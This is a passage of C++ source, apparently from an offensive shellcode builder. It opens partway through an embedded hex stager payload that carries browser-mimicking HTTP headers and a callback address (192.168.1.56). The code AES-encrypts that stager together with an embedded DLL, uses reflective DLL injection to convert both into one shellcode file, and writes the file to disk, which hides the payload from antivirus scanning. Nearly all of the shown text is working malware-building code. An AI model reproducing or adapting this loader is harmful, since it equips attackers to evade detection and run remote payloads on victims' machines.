6e\x2e\x6a\x73\x00\xe4\x3a\xdb\x3b\x39\x18\xcc\x7a\x77\x31\xf4\xd9\xa3\xad\xce\xcf\xc5\xf1\xc3\x5d\xdb\xf6\x97\xe6\x84\xc5\x4b\xbe\xc4\x4b\x57\xee\xba\x3b\x1a\x9d\x4b\x3d\xa0\x08\xd1\x70\x41\x39\x2c\x62\x6b\x2f\xec\x33\x01\x6d\xcb\x00\x41\x63\x63\x65\x70\x74\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x68\x74\x6d\x6c\x2b\x78\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x6d\x6c\x3b\x71\x3d\x30\x2e\x39\x2c\x2a\x2f\x2a\x3b\x71\x3d\x30\x2e\x38\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x2d\x55\x53\x2c\x65\x6e\x3b\x71\x3d\x30\x2e\x35\x0d\x0a\x52\x65\x66\x65\x72\x65\x72\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x63\x6f\x64\x65\x2e\x6a\x71\x75\x65\x72\x79\x2e\x63\x6f\x6d\x2f\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70\x2c\x20\x64\x65\x66\x6c\x61\x74\x65\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x33\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b\x20\x72\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x0d\x0a\x00\xe2\x22\xc0\x87\x82\x3b\xfd\xf4\xf3\x86\x42\xbd\xea\x5e\xae\x75\x53\x3b\x96\x2e\xd5\xf3\x95\xf9\x82\x29\xfa\x7b\x37\x87\x9c\x72\x25\x2c\x66\xa6\xab\x7a\x33\x9e\x25\x4d\xbe\xb3\x31\xe7\xfb\xe1\x7d\x66\x3a\xba\x90\x17\x3b\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\xaf\x0f\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x89\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x35\x36\x00\x12\x34\x56\x78";

	// Load dll resource
	hmRawDll = GetModuleHandle(nullptr);
	hrRawDll = FindResource(hmRawDll, MAKEINTRESOURCE(IDR_DLL_X861), L"DLL_X86");
	hgRawDll = LoadResource(hmRawDll, hrRawDll);
	cbRawDll = SizeofResource(hmRawDll, hrRawDll);
	lpRawDll = LockResource(hgRawDll);

	rgbRawDll = new BYTE[cbRawDll];
	memcpy(rgbRawDll, lpRawDll, cbRawDll);

	// Generate keys
	GenerateRandomBytes(rgbDllAES128Key, sizeof(rgbDllAES128Key));
	GenerateRandomBytes(rgbDllIV, sizeof(rgbDllIV));
	GenerateRandomBytes(rgbIV, sizeof(rgbIV));
	GenerateRandomBytes(rgbAES128Key, sizeof(rgbAES128Key));
	
	// Open an algorithm handle.
	if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(
		&hAesAlg,
		BCRYPT_AES_ALGORITHM,
		NULL,
		0)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptOpenAlgorithmProvider\n", status);
		goto Cleanup;
	}

	///
	// Encrypt payload
	///
	
	// Calculate the size of the buffer to hold the KeyObject.
	if (!NT_SUCCESS(status = BCryptGetProperty(
		hAesAlg,
		BCRYPT_OBJECT_LENGTH,
		reinterpret_cast<PBYTE>(&cbKeyObject),
		sizeof(DWORD),
		&cbData,
		0)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptGetProperty\n", status);
		goto Cleanup;
	}

	// Allocate the key object on the heap.
	pbKeyObject = static_cast<PBYTE>(HeapAlloc(GetProcessHeap(), 0, cbKeyObject));
	if (nullptr == pbKeyObject)
	{
		wprintf(L"[!] memory allocation failed\n");
		goto Cleanup;
	}

	// Calculate the block length for the IV.
	if (!NT_SUCCESS(status = BCryptGetProperty(
		hAesAlg,
		BCRYPT_BLOCK_LENGTH,
		reinterpret_cast<PBYTE>(&cbBlockLen),
		sizeof(DWORD),
		&cbData,
		0)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptGetProperty\n", status);
		goto Cleanup;
	}

	// Determine whether the cbBlockLen is not longer than the IV length.
	if (cbBlockLen > sizeof(rgbIV))
	{
		wprintf(L"[!] block length is longer than the provided IV length\n");
		goto Cleanup;
	}

	// Allocate a buffer for the IV. The buffer is consumed during the 
	// encrypt/decrypt process.
	pbIV = static_cast<PBYTE>(HeapAlloc(GetProcessHeap(), 0, cbBlockLen));
	if (nullptr == pbIV)
	{
		wprintf(L"[!] memory allocation failed\n");
		goto Cleanup;
	}

	memcpy(pbIV, rgbIV, cbBlockLen);

	if (!NT_SUCCESS(status = BCryptSetProperty(
		hAesAlg,
		BCRYPT_CHAINING_MODE,
		(PBYTE)BCRYPT_CHAIN_MODE_CBC,
		sizeof(BCRYPT_CHAIN_MODE_CBC),
		0)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptSetProperty\n", status);
		goto Cleanup;
	}

	// Generate the key from supplied input key bytes.
	if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(
		hAesAlg,
		&hKey,
		pbKeyObject,
		cbKeyObject,
		static_cast<PBYTE>(rgbAES128Key),
		sizeof(rgbAES128Key),
		0)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptGenerateSymmetricKey\n", status);
		goto Cleanup;
	}

	cbRawPayload = sizeof(rgbRawPayload);
	pbRawPayload = static_cast<PBYTE>(HeapAlloc(GetProcessHeap(), 0, cbRawPayload));
	if (nullptr == pbRawPayload)
	{
		wprintf(L"[!] memory allocation failed\n");
		goto Cleanup;
	}

	memcpy(pbRawPayload, rgbRawPayload, sizeof(rgbRawPayload));

	//
	// Get the output buffer size.
	//
	if (!NT_SUCCESS(status = BCryptEncrypt(
		hKey,
		pbRawPayload,
		cbRawPayload,
		NULL,
		pbIV,
		cbBlockLen,
		NULL,
		0,
		&cbCipherPayload,
		BCRYPT_BLOCK_PADDING)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptEncrypt\n", status);
		goto Cleanup;
	}

	pbCipherPayload = static_cast<PBYTE>(HeapAlloc(GetProcessHeap(), 0, cbCipherPayload + 32));
	if (nullptr == pbCipherPayload)
	{
		wprintf(L"[!] memory allocation failed\n");
		goto Cleanup;
	}

	// Use the key to encrypt the plaintext buffer.
	// For block sized messages, block padding will add an extra block.
	if (!NT_SUCCESS(status = BCryptEncrypt(
		hKey,
		pbRawPayload,
		cbRawPayload,
		NULL,
		pbIV,
		cbBlockLen,
		pbCipherPayload,
		cbCipherPayload,
		&cbData,
		BCRYPT_BLOCK_PADDING)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptEncrypt\n", status);
		goto Cleanup;
	}

	// Copy key and iv to creds buffer
	std::copy_n(rgbAES128Key, 16, creds);
	std::copy_n(rgbIV, 16, creds + 16);

	// Append creds to cipher text
	memcpy(&pbCipherPayload[cbCipherPayload], creds, sizeof(creds));

#ifdef _DEBUG
	wprintf(L"[+] Dumping payload creds:\n");
	HexDump(creds, sizeof(creds));
	wprintf(L"[+] Dumping payload:\n");
	HexDump(pbCipherPayload, cbCipherPayload + 32);
#endif

	///
	// Encrypt Dll
	///

	HeapFree(GetProcessHeap(), 0, pbKeyObject);
	HeapFree(GetProcessHeap(), 0, pbIV);
	
	cbData = 0;
	cbKeyObject = 0;
	cbBlockLen = 0;
	pbKeyObject = nullptr;
	pbIV = nullptr;
	hKey = nullptr;
	
	// Calculate the size of the buffer to hold the KeyObject.
	if (!NT_SUCCESS(status = BCryptGetProperty(
		hAesAlg,
		BCRYPT_OBJECT_LENGTH,
		reinterpret_cast<PBYTE>(&cbKeyObject),
		sizeof(DWORD),
		&cbData,
		0)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptGetProperty\n", status);
		goto Cleanup;
	}

	// Allocate the key object on the heap.
	pbKeyObject = static_cast<PBYTE>(HeapAlloc(GetProcessHeap(), 0, cbKeyObject));
	if (nullptr == pbKeyObject)
	{
		wprintf(L"[!] memory allocation failed\n");
		goto Cleanup;
	}

	// Calculate the block length for the IV.
	if (!NT_SUCCESS(status = BCryptGetProperty(
		hAesAlg,
		BCRYPT_BLOCK_LENGTH,
		reinterpret_cast<PBYTE>(&cbBlockLen),
		sizeof(DWORD),
		&cbData,
		0)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptGetProperty\n", status);
		goto Cleanup;
	}

	// Determine whether the cbBlockLen is not longer than the IV length.
	if (cbBlockLen > sizeof(rgbDllIV))
	{
		wprintf(L"[!] block length is longer than the provided IV length\n");
		goto Cleanup;
	}

	// Allocate a buffer for the IV. The buffer is consumed during the 
	// encrypt/decrypt process.
	pbIV = static_cast<PBYTE>(HeapAlloc(GetProcessHeap(), 0, cbBlockLen));
	if (nullptr == pbIV)
	{
		wprintf(L"[!] memory allocation failed\n");
		goto Cleanup;
	}

	memcpy(pbIV, rgbDllIV, cbBlockLen);

	if (!NT_SUCCESS(status = BCryptSetProperty(
		hAesAlg,
		BCRYPT_CHAINING_MODE,
		(PBYTE)BCRYPT_CHAIN_MODE_CBC,
		sizeof(BCRYPT_CHAIN_MODE_CBC),
		0)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptSetProperty\n", status);
		goto Cleanup;
	}

	// Generate the key from supplied input key bytes.
	if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(
		hAesAlg,
		&hKey,
		pbKeyObject,
		cbKeyObject,
		static_cast<PBYTE>(rgbDllAES128Key),
		sizeof(rgbDllAES128Key),
		0)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptGenerateSymmetricKey\n", status);
		goto Cleanup;
	}

	/*cbRawDll = sizeof(rgbRawDll);*/
	pbRawDll = static_cast<PBYTE>(HeapAlloc(GetProcessHeap(), 0, cbRawDll));
	if (nullptr == pbRawDll)
	{
		wprintf(L"[!] memory allocation failed\n");
		goto Cleanup;
	}

	memcpy(pbRawDll, rgbRawDll, cbRawDll);

	//
	// Get the output buffer size.
	//
	if (!NT_SUCCESS(status = BCryptEncrypt(
		hKey,
		pbRawDll,
		cbRawDll,
		NULL,
		pbIV,
		cbBlockLen,
		NULL,
		0,
		&cbCipherDll,
		BCRYPT_BLOCK_PADDING)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptEncrypt\n", status);
		goto Cleanup;
	}

	pbCipherDll = static_cast<PBYTE>(HeapAlloc(GetProcessHeap(), 0, cbCipherDll + 32));
	if (nullptr == pbCipherDll)
	{
		wprintf(L"[!] memory allocation failed\n");
		goto Cleanup;
	}

	// Copy key and iv to dll creds buffer
	std::copy_n(rgbDllAES128Key, 16, dllCreds);
	std::copy_n(rgbDllIV, 16, dllCreds + 16);

	// Prefix cipher text with creds
	memcpy(pbCipherDll, dllCreds, sizeof(dllCreds));

	// Use the key to encrypt the plaintext buffer.
	// For block sized messages, block padding will add an extra block.
	if (!NT_SUCCESS(status = BCryptEncrypt(
		hKey,
		pbRawDll,
		cbRawDll,
		NULL,
		pbIV,
		cbBlockLen,
		&pbCipherDll[32],
		cbCipherDll + 32,
		&cbData,
		BCRYPT_BLOCK_PADDING)))
	{
		wprintf(L"[!] Error 0x%x returned by BCryptEncrypt\n", status);
		goto Cleanup;
	}

#ifdef _DEBUG
	wprintf(L"[+] Dumping dll creds\n");
	HexDump(dllCreds, sizeof(dllCreds));
	wprintf(L"[+] Dumping cipher Dll\n");
	HexDump(pbCipherDll, cbCipherDll + 32);
#endif

	///
	// Create shellcode
	///
	
	if (rgbRawDll[0] == 'M' && rgbRawDll[1] == 'Z') {
		wprintf(L"[+] File is a DLL, attempting to convert\n");

		if (!ConvertToShellcode(
			pbCipherDll,
			cbCipherDll + 32,
			HashFunctionName((LPSTR)"Run"), 
			pbCipherPayload, 
			cbCipherPayload + 32, 
			finalShellcode, 
			finalSize,
			rgbRawDll
		)) 
		{
			wprintf(L"[!] Failed to convert DLL\n");
			goto Cleanup;
		}

		wprintf(L"[+] Successfully Converted\n");
	}
	else {
		goto Cleanup;
	}

	// todo: add parameter or something for out file
	// Write shellcode to file
	outFile = std::fstream(R"(C:\Users\Philip\source\repos\BeakeyBoi\bin\FinalShellcodeRDI_x86.bin)", 
		std::ios::out | std::ios::binary);
	outFile.write(finalShellcode, finalSize);
	outFile.close();

Cleanup:
	
	if (hAesAlg)
		BCryptCloseAlgorithmProvider(hAesAlg, 0);

	if (hKey)
		BCryptDestroyKey(hKey);

	if (pbCipherPayload)
		HeapFree(GetProcessHeap(), 0, pbCipherPayload);

	if (pbRawPayload)
		HeapFree(GetProcessHeap(), 0, pbRawPayload);

	if (pbKeyObject)
		HeapFree(GetProcessHeap(), 0, pbKeyObject);

	if (pbIV)
		HeapFree(GetProcessHeap(), 0, pbIV);

	if (rgbRawDll)
		delete[] rgbRawDll;

	return status;
}
